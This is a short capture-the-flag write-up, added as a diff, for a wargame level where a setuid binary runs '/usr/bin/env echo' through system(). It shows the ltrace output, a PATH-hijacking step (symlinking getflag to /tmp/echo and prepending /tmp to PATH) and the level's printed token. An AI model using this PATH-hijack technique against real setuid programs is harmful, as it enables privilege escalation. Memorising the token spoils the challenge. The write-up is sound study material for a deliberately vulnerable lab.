@@ -1,0 +1,31 @@
+Home contains a executable anmed level03.
+When run, it prints out "Exploit me".
+
+Using ltrace to see all library calls.
+
+		ltrace ./level03
+
+	__libc_start_main(0x80484a4, 1, 0xbffff7c4, 0x8048510, 0x8048580 <unfinished ...>
+	getegid()                                             = 2003
+	geteuid()                                             = 2003
+	setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)   = 0
+	setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)   = 0
+	system("/usr/bin/env echo Exploit me"Exploit me
+	 <unfinished ...>
+	--- SIGCHLD (Child exited) ---
+	<... system resumed> )                                = 0
+	+++ exited (status 0) +++
+
+
+Notice how the system call uses /usr/bin/env before 'echo'. This means that the system call searchs the fist executable in PATH environement variable.
+This means we can provide our own echo, modify the path so that this echo is called in preference to the built-in, and then we can run arbitrary commands.
+The easiest way to provide our own echo that runs getflag is to just create a symbolic link to getflag.
+As we don't have write rights in homedir, we'll use /tmp.
+
+		ln -s /bin/getflag /tmp/echo
+		export PATH=/tmp:$PATH
+		./level03
+
+	Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+LEVEL02 PASSWORD: qi0maab88jeaj46qoumi7maus
